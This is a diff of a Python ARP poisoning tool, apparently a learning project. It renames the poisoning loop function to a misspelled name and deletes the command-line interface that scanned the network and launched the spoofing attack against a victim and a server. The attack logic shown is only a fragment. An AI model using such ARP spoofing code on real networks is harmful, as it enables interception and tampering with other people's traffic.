@@ -56,7 +56,7 @@ def stop_attack(victim_ip, real_ip, victim_mac, real_mac):
 
 ## Now to start the attack, keep it goining, and stop it when we want.
 # We try to keep the ARP table of the victim poisoned by sending packets in a loop.
-def arp_poison_loop(victim_ip, server_ip):
+def arp_poisonening(victim_ip, server_ip):
     try:
         victim_mac = get_mac(victim_ip)
         server_mac = get_mac(server_ip)
@@ -69,23 +69,5 @@ def arp_poison_loop(victim_ip, server_ip):
         stop_attack(victim_ip, server_ip, victim_mac, server_mac)
         stop_attack(server_ip, victim_ip, server_mac, victim_mac)
 
-## Now that everything is set up, we want to make it easier to use this.
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="ARP poisoning tool")
-    parser.add_argument("--victim", help="Victim IP adress")
-    parser.add_argument("--server", help="Server IP adress")
-    parser.add_argument("--scan", help="Network IP range to scan", default=None)
-    # Let the user input become variables
-    args = parser.parse_args()
-    #if --scan was used, scan the network and print discobered adresses
-    if args.scan:
-        hosts=network_scan(args.scan)
-        print("Found hosts:")
-        for host in hosts:
-            print(f"{host['ip']} - {host['mac']}")
-    # if a victim and server are given, start the spoofing attack
-    elif args.victim and args.server:
-        arp_poison_loop(args.victim, args.server)
-    # if wrong input was given, give help
-    else:
-        parser.print_help()
+
+
